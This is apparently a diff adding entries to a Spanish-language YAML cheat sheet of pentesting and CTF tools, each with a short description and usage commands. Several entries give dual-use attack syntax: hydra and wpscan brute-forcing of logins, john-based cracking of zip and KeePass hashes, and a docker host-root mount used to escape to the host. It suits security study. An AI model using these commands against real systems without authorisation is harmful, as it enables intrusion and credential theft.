+  description: "Editor hexadecimal interactivo basado en consola para la modificación directa de bytes en ficheros binarios."
+  command: |
+    hexeditor [file]
+
+- tool: xxd
+  category: encoding
+  tags: [hex, binary, dump]
+  description: "Utilidad de volcado hexadecimal y operaciones inversas sobre archivos binarios crudos."
+  command: |
+    xxd -l NRO [file] # Leer y limitar el output a una cantidad exacta de bytes definidos
+
+- tool: objdump
+  category: info
+  tags: [binary, reverse-engineering, disassembly]
+  description: "Herramienta de inspección integrada en GNU Binutils enfocada en el desensamblado de ejecutables y extracción de metadatos internos."
+  command: |
+    objdump [OPCIONES] [ARCHIVO]  # 
+    Secciones clave del layout binario  # .text (Instrucciones ejecutables), .rodata (Strings hardcodeadas), .bss/.data (Variables globales)
+    -d, --disassemble # Desensamblar secciones con instrucciones de código ejecutable
+    -d _main  # Especificar y aislar un símbolo o función concreta
+    -D, --disassemble-all # Desensamblar la totalidad del archivo (incluye datos crudos y secciones no ejecutables)
+    -h, --section-headers # Ver cabeceras internas de las secciones (direcciones virtuales, tamaños)
+    -x, --all-headers # Mostrar la totalidad de la información interna estructurada
+    -t, --syms  # Listar de forma explícita la tabla de símbolos del binario
+    -S, --source  # Intercalar las instrucciones de ensamblador con código fuente (requiere flags de depuración -g)
+    -M intel  # Forzar la sintaxis de visualización a formato Intel (por defecto usa AT&T)
+    -R, --dynamic-reloc # Desplegar la Global Offset Table (GOT) y direcciones dinámicas externas
+    -j <SECCIÓN>  # Acotar la operación a una sección específica (Ej: -d -j .plt / -s -j .got.plt)
+
+- tool: readelf
+  category: info
+  tags: [elf, binary, structure]
+  description: "Herramienta de GNU Binutils dedicada en exclusiva al análisis y layout de la estructura interna de archivos con formato ejecutable ELF."
+  command: |
+    readelf [OPCIONES] [ARCHIVO]  # 
+    -h, --file-header # Mostrar la cabecera ELF principal (arquitectura, punto de entrada)
+    -l, --program-headers # Ver segmentos de carga en memoria e identificar mitigaciones como GNU_RELRO
+    -S, --section-headers # Listar la disposición de las secciones con sus flags de permisos correspondientes
+    -r, --relocs  # Mostrar de forma directa la tabla de reubicaciones sin requerir desensamblado
+    -d, --dynamic # Ver la sección dinámica y comprobar dependencias o flags críticos (BIND_NOW/Full RELRO)
+    -s, --syms  # Extraer de forma estructurada la tabla de símbolos completa
+    -x <SECCIÓN>  # Realizar un volcado hexadecimal raw del contenido específico de una sección
+    -a, --all # Desplegar de forma masiva toda la información interna estructurada
+    -W, --wide  # Evitar el truncamiento de cadenas en pantallas ajustadas (Recomendable)
+
+- tool: checksec
+  category: info
+  tags: [binary, security, mitigations, pwntools]
+  description: "Script de comprobación rápida para evaluar las protecciones de seguridad activas en un archivo ejecutable."
+  command: |
+    checksec --file=ARCHIVO # 
+    checksec ARCHIVO  # Sintaxis simplificada común bajo entornos que usan pwntools
+    Mitigaciones evaluadas:
+    RELRO: No RELRO / Partial RELRO (.got.plt sigue escribible) / Full RELRO (GOT completa de solo lectura)
+    Stack Canary: Identifica si existen valores de control en el stack para frenar corrupciones de memoria
+    NX (No-eXecute): Determina si el stack impide la ejecución directa de shellcodes inyectados
+    PIE: Position Independent Executable (Define si el binario se carga en direcciones bases aleatorias)
+    RPATH/RUNPATH: Rutas embebidas de búsqueda (Su vulnerabilidad abre paso a ataques de Library Hijacking)
+    Symbols: Indica si el binario conserva metadatos funcionales o ha sido despojado de ellos ("stripped")
+    FORTIFY: Comprueba si se compilaron wrappers de validación de límites para funciones clásicas e inseguras
+
+- tool: xfreerdp
+  category: network
+  tags: [rdp, remote-desktop, windows]
+  description: "Cliente por línea de comandos nativo para interactuar con sistemas remotos a través del protocolo RDP."
+  command: |
+    xfreerdp /u:[username] /p:[password] /v:[host-IP] /dynamic-resolution
+
+- tool: hydra
+  category: exploitation
+  tags: [bruteforce, login, cracking]
+  description: "Herramienta de ataque por diccionario paralela optimizada para vulnerar servicios de autenticación y logins web."
+  command: |
+    hydra -L [users_file] -P [pass_file] <protocolo>://IP:PORT  # 
+    hydra -l|-L [user_param] -p|-P [pass_param] <IP> http-post-form '/ruta/:user=^USER^&pass=^PASS^:F=<Texto_de_fallo>' # Fuerza bruta orientada a formularios HTTP POST estructurados
+
+- tool: wpscan
+  category: web
+  tags: [wordpress, scanner, enumeration]
+  description: "Escáner automatizado de seguridad especializado en la detección de fallos y enumeración en entornos WordPress."
+  command: |
+    wpscan --update # Sincronizar la base de datos de vulnerabilidades local
+    wpscan [URL] --enumerate u  # Forzar un ciclo de descubrimiento de usuarios válidos
+    wpscan [URL] --usernames <file> --passwords <file> # Lanzar ataque de diccionario masivo dirigido
+    # --no-banner (Ocultar banners repetitivos de la interfaz)
+    # --max-threads / -t <val>  # (Modificar número de hilos concurrentes; valor por defecto: 5)
+    # --password-attack wp-login  # Atacar directamente el endpoint /wp-login.php
+    # --password-attack xmlrpc  # Explotar xmlrpc.php para procesar múltiples credenciales por petición
+    # --api-token <token> # Vincular token personal para reportes extendidos de vulnerabilidades
+    # --login-uri /ruta-custom  # Declarar rutas personalizadas en configuraciones que ocultan el login
+
+- tool: tar
+  category: utility
+  tags: [compression, extraction, archive]
+  description: "Utilidad del sistema operativo encargada de la manipulación y extracción de paquetes archivados."
+  command: |
+    tar -xf archivo.tar # 
+    -c  # Crea un nuevo archivo.
+    -z  # Archiva a través de gzip
+    -v  # Verbose, lista los archivos procesados
+    -f  # File|Archivo
+    - - # El guión indica a tar que use el in/out predeterminado en lugar de crear un archivo en el disco duro.
+    -x  # Extract
+    -z  # Extraer gzip
+    -v  # Verbose
+    -f  # File|Archivo
+     
+- tool: unzip
+  category: utility
+  tags: [compression, extraction, zip]
+  description: "Utilidad del sistema orientada al listado, comprobación y descompresión de archivos zip comprimidos."
+  command: |
+    unzip archivo.zip # 
+    zip2john file.ext > file.hash # Integración con herramientas de cracking para romper contraseñas del contenedor
+
+- tool: steghide
+  category: forensic
+  tags: [steganography, extraction, hidden-data]
+  description: "Herramienta clásica de esteganografía que permite ocultar o extraer información secreta embebida en ficheros de imagen o audio."
+  command: |
+    steghide info [archivo] # Evaluar la presencia de datos adjuntos en el archivo
+    steghide extract -sf [archivo]  # Extraer el archivo oculto pidiendo contraseña de forma interactiva
+    steghide extract [archivo] -p password  # Pasar la clave directamente por parámetro en línea de comandos
+    steghide -xf [archivo]  # Forzar la extracción inmediata cuando ya se conoce el contenido interno
+
+- tool: stegseek
+  category: forensic
+  tags: [steganography, cracker, bruteforce]
+  description: "Herramienta de alto rendimiento diseñada para crackear por fuerza bruta las contraseñas de archivos modificados con steghide."
+  command: |
+    stegseek -sf [archivo]  # 
+    stegseek -sf [archivo] -wl [wordlist-path]  # 
+    stegseek -xf [archivo]  # 
+    stegseek [file] /usr/share/wordlists/rockyou.txt  # Ataque masivo directo con diccionarios extensos
+
+- tool: openssl
+  category: crypto
+  tags: [encryption, decryption, certificates, rsa]
+  description: "Caja de herramientas de criptografía estándar para cifrado de datos, inspección de llaves y conexiones mTLS."
+  command: |
+    openssl passwd [password-a-cifrar]  # Cifrar contraseñas bajo hashes del sistema
+    openssl pkeyutl -decrypt -inkey <private_key> -in <cipher_file> # Descifrado asimétrico RSA mediante llave privada
+    openssl rsa -pubin -in key.pub -text -noout # Desplegar componentes internos legibles de una clave pública
+    openssl rsa -in key_rsa -text -noout  # Analizar matemáticamente los valores internos de una clave privada RSA
+    openssl s_client -connect <IP>:<PORT> -cert <cert>.crt -key <key>.key # Entablar conexiones TLS usando autenticación mutua (mTLS)
+    openssl también se compone de otros comandos dependiendo de los certificados:
+    openssl-x509  # Se puede ver el manual
+    openssl x509 -in certificado.pem -text -out certificado.txt # Convierte el certificado en un string
+
+
+- tool: grep
+  category: utility
+  tags: [search, filter, text, regex]
+  description: "Herramienta integrada del sistema de filtrado y búsqueda de patrones de texto basada en expresiones regulares."
+  command: |
+    grep <file> -oP '\d{1.3}(\.[\d]{1,3}){3}' # Grep IP
+    -v  # Invertir la selección; omite los aciertos encontrados)
+    -i  # Ignorar explícitamente diferencias entre mayúsculas y minúsculas)
+    -E  # Habilita el uso de Expresiones Regulares Extendidas)
+    -n  # Desplegar el número de línea exacto de los aciertos en el archivo)
+    -o  # Only Matching
+    -w  # Selecciona sólo esas líneas que contienen la palabra completa
+    -P  # Perl Regex
+
+- tool: awk
+  category: utility
+  tags: [search, filter, text]
+  description: "Herramienta integrada en el sistema para múltiples funcionalidades, principalmente filtrado de palabras y expresiones"
+  command: |
+    cat archivo.txt | awk '{for(i=1; i<=NF; i++) if(length($i) > 5) print $i} # Ayuda a filtrar por longitud de caracteres
+
+- tool: docker
+  category: utility
+  tags: [container, so]
+  description: "Empaquetar aplicaciones y sus dependencias en unidades estandarizadas llamadas contenedores"
+  command: |
+    docker run -v /:/mnt --rm -it alpine chroot /mnt bash # Monta una imágen
+    El comando anterior ejecuta
+    docker run  # Inicia un contenedor
+    -v /:/mnt # Monta la raíz del disco local en la carpeta /mnt del contenedor
+    --rm  # Elimina el contenedor automáticamente al salir
+    -it # Mantiene la sesión interactiva en la terminal
+    apline  # La imágen de Linux que se usa como base (puede variar)
+    chroot /mnt bash  # Cambia la raíz del sistema del contenedor hacia /mnt (nuestro host) y ejecuta una bash.
+
+- tool: pspy
+  category: info
+  tags: [monitoring, processes, cronjobs]
+  description: "Herramienta de monitorización activa de procesos en entornos Linux en tiempo real sin requerir privilegios de root (útil para auditar cronjobs)."
+  command: |
+    ./pspy64  # 
+
+- tool: pop3
+  category: network
+  tags: [pop3, protocol, mail, nc]
+  description: "Comandos de interacción e investigación manual sobre el protocolo de correo POP3 utilizando sockets abiertos."
+  command: |
+    nc <IP> <PORT>  # 
+    USER [username] # USER
+    PASS [password] # PASSWORD
+    STAT  # Muestra de forma concisa el número de mensajes almacenados y su tamaño
+    LIST  # Listar los identificadores de mensajes junto a su peso en bytes
+    RETR [n]  # Recuperar y desplegar el cuerpo completo del mensaje número n
+    TOP [n] [m] # Leer de forma limitada las primeras m líneas pertenecientes al mensaje n
+    DELE [n]  # Marcar temporalmente el mensaje n para su posterior eliminación física
+    QUIT  # Concluir la interacción en el puerto aplicando de forma efectiva los borrados marcados
+
+- tool: kpcli
+  category: utility
+  tags: [keepass, credentials, password-manager, cracking]
+  description: "Gestor e interfaz interactiva por línea de comandos para bases de datos de contraseñas KeePass (.kdbx)."
+  command: |
+    ls, cd, show -p # Comandos de navegación habituales en la shell interna
+    kpcli --kdb [archivo.kdbx] 
+    keepass2john archivo.kdbx > archivo.hash  # Flujo para ataques de fuerza bruta externos
+    john --wordlist=/ruta/a/rockyou.txt archivo.hash
+
+- tool: borg
+  category: utility
+  tags: [backup, archive, extract]
+  description: "Herramienta eficiente de deduplicación y almacenamiento seguro de copias de seguridad (backups)."
+  command: |
+    Para extraer un archivo se debe crear un directorio aparte y en ese directorio extraer el backup # 
+    borg list /path/a/listar  # Listar el contenido del repositorio de backups
+    borg info /path/para/información  # Obtener metadatos descriptivos del archivo comprimido
+    borg extract /path/::archivo  # Extraer elementos definidos del backup
+
+- tool: smbclient
+  category: network
+  tags: [smb, windows, file-sharing, protocol]
+  description: "Cliente interactivo diseñado para listar y transferir recursos compartidos bajo el protocolo de red SMB/CIFS de Microsoft Windows."
+  command: |
+    smbclient -L //server -p <PORT> -N  # Listar recursos expuestos en el servidor de forma anónima (sin clave)
+    smbclient //server/path -p <PORT> -N  # Conectarse directamente al recurso compartido sin contraseña
+    ls, cd, get, help # Operadores disponibles dentro del prompt
+
+- tool: netexec
+  category: network
+  tags: [exploitation, wmi, winrm, vnc, ssh, rdp, nfs, ldap, ftp, smb, mssql]
+  description: "Servicio de explotación de redes que ayuda a automatizar la evaluación de la seguridad de redes grandes"
+  command: |
+    netexec <PROTOCOLO> <IP>  # 
+
+- tool: rsync
+  category: network
+  tags: [file-transfer, sync, delta-encoding]
+  description: "Herramienta de sincronización rápida y transmisión incremental remota de directorios utilizando algoritmos de delta encoding."
+  command: |
+    rsync --list-only rsync://ip  # Listar el árbol de directorios y ficheros expuestos
+    rsync rsync://ip/path # Acceder al recurso remoto localizado previamente
+    rsync rsync://user@ip/path  # Autenticarse e interactuar bajo un contexto de usuario específico
+    rsync /path/local/file rsync://ip/path  # Transferir y cargar un archivo local al servidor remoto
+
+- tool: rpcbind
+  category: network
+  tags: [rpc, remote-procedure-call, infrastructure, enumeration]
+  description: "Servicio de infraestructura que gestiona llamadas a procedimientos remotos (RPC) y mapea los puertos de escucha correspondientes."
+  command: |
+    nc -z -v -u <target-ip> 111 # Validar de forma directa el estado del puerto RPC estándar (Puerto 111 UDP/TCP)
+    nmap --script nfs* <IP> # Ejecutar scripts automatizados para detectar montajes de red asociados
+    rpcinfo -p <IP> # Consultar el mapeador de puertos remoto para desvelar servicios activos
+
+- tool: enum4linux
+  category: network
+  tags: [enumeration, samba, smb, rid-cycling]
+  description: "Script de enumeración automatizada que unifica herramientas de Samba para la recolección de datos e identificación de usuarios vía ciclos RID."
+  command: |
+    enum4linux -a <IP>  # Forzar de forma masiva todas las rutinas de enumeración simples
+
+- tool: showmount
+  category: network
+  tags: [nfs, enumeration, mounts]
+  description: "Utilidad de diagnóstico para interrogar al demonio de montaje de un servidor remoto NFS."
+  command: |
+    showmount [FLAG] <IP> # 
+    Modificadores frecuentes de consulta  #
+    -a  # Visualizar montajes activos
+    -d  # Listar únicamente directorios
+    -e  # Mostrar la lista de directorios exportados
+
+- tool: mount
+  category: system
+  tags: [nfs, storage, network-file-system]
+  description: "Comando del sistema operativo para acoplar de forma local estructuras de archivos compartidas en red bajo el protocolo NFS (Soportado en RPC)."
+  command: |
+    sudo mount -t nfs <IP>:/found/path /dir/to/mount  # Enlazar la carpeta remota (localizada previamente con showmount)
+
+- tool: redis-cli
+  category: database
+  tags: [redis, key-value, memory-db]
+  description: "Cliente de consola interactiva para administrar e interrogar bases de datos NoSQL Key-Value residentes en memoria RAM (Redis)."
+  command: |
+    redis-cli -h <HOST> -p <PORT> -a <PASSWORD> # 
+    INFO  # Inspeccionar estadísticas globales del motor y el sistema operativo
+    INFO keyspace # Inspecciona todas las estadísticas, ayuda a ver cuál está disponible
+    SELECT [0-16] # Conmutar entre los entornos lógicos indexados de bases de datos
+    KEYS *  # Listar de forma explícita todas las claves residentes en el espacio activo
+    TYPE [key]  # Validar la tipología del valor de la clave analizada
+    GET [key] # Extraer de forma directa el valor almacenado en una "key" string
+    MGET [key1, keyN...]  # Extraer de forma directa el valor de múltiples "key" string
+    LRANGE [key]  # Listar listas
+
+- tool: extra
+  category: extra
+  tags: [extra]
+  description: "Herramientas útiles alternativas"
+  command: |
+     printf '52:54:00:%02x:%02x:%02x\n' $((RANDOM%256)) $((RANDOM%256)) $((RANDOM%256)) #
